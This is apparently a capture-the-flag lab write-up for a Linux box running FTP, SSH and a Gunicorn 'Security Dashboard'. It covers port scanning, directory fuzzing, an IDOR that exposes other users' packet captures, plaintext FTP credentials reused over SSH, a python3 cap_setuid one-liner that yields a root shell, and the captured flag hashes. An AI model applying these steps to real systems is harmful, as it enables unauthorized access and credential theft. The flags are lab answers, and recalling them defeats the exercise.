# IP
10.129.148.255

# Reconnaissance
``` sh
ping -c 2 10.129.148.255
PING 10.129.148.255 (10.129.148.255) 56(84) bytes of data.
64 bytes from 10.129.148.255: icmp_seq=1 ttl=63 time=182 ms
64 bytes from 10.129.148.255: icmp_seq=2 ttl=63 time=182 ms

--- 10.129.148.255 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1002ms
rtt min/avg/max/mdev = 181.978/182.173/182.369/0.195 ms
```
Device reachable with ICMP protocol
TTL hints is a linux OS
# Ports scaning
## Quick scan
``` sh
sudo nmap -sS -p- --open -Pn -n 10.129.148.255
Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-30 12:27 -0300
Nmap scan report for 10.129.148.255
Host is up (0.28s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 56.56 seconds
```
## Deep scan
``` sh
sudo nmap -sS -sCV -p21,22,80 -Pn -n 10.129.148.255
Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-30 12:29 -0300
Nmap scan report for 10.129.148.255
Host is up (0.22s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA)
|   256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA)
|_  256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519)
80/tcp open  http    Gunicorn
|_http-server-header: gunicorn
|_http-title: Security Dashboard
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.49 seconds
```
# Web enumeration
The web is a dashboard that contains network information
The web has a feature to capture network information
We are logged in as user *Nathan*
## Service running
``` sh
whatweb 10.129.148.255:80
http://10.129.148.255:80 [200 OK] Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[gunicorn], IP[10.129.148.255], JQuery[2.2.4], Modernizr[2.8.3.min], Script, Title[Security Dashboard], X-UA-Compatible[ie=edge]
```
## Dir Fuzzing
``` sh
gobuster dir -u http://10.129.148.255:80/ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-medium.txt
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.148.255:80/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
data                 (Status: 302) [Size: 208] [--> http://10.129.148.255/]
ip                   (Status: 200) [Size: 17450]
netstat              (Status: 200) [Size: 28503]
capture              (Status: 302) [Size: 220] [--> http://10.129.148.255/data/1]
```
## Fuzzing data
When capturing the network information we are redirected to /data/id
When trying to modify the id parameter i found out it is vulnerable to IDOOR
``` sh
ffuf -u http://10.129.148.255/data/FUZZ -w /usr/share/seclists/Fuzzing/3-digits-000-999.txt -fc 302

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.148.255/data/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Fuzzing/3-digits-000-999.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response status: 302
________________________________________________

000                     [Status: 200, Size: 17147, Words: 7066, Lines: 371, Duration: 219ms]
001                     [Status: 200, Size: 17150, Words: 7066, Lines: 371, Duration: 236ms]
:: Progress: [1000/1000] :: Job [1/1] :: 185 req/sec :: Duration: [0:00:05] :: Errors: 0 ::
```
## Downloading captures
Since the web is vulnerable to IDOOR, let's download other user's network captures and read them
``` sh
wget http://10.129.148.255/download/0
strings 0
```
We can see the ftp credentials in plain text
``` sh
strings 0 | grep USER
USER nathan
strings 0 | grep PASS
PASS Buck3tH4TF0RM3!
```
# FTP enumeration
Login in as *nathan* there's a *user.txt* file available
``` sh
cat user.txt
5ba882c485029710876726af959a6dbb
```
# SSH
Trying to login to SSH with the same credentials
``` sh
ssh nathan@10.129.148.255
```
# Privilege Escalation
## Capabilities
```sh
getcap -r / 2>/dev/null
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
```
# Root
```sh
python3 -c 'import os; os.setuid(0); os.execl("/bin/sh", "sh")'
whoami
root
cat /root/root.txt
57a47f6a76caaa50302d47e3c61df750
```
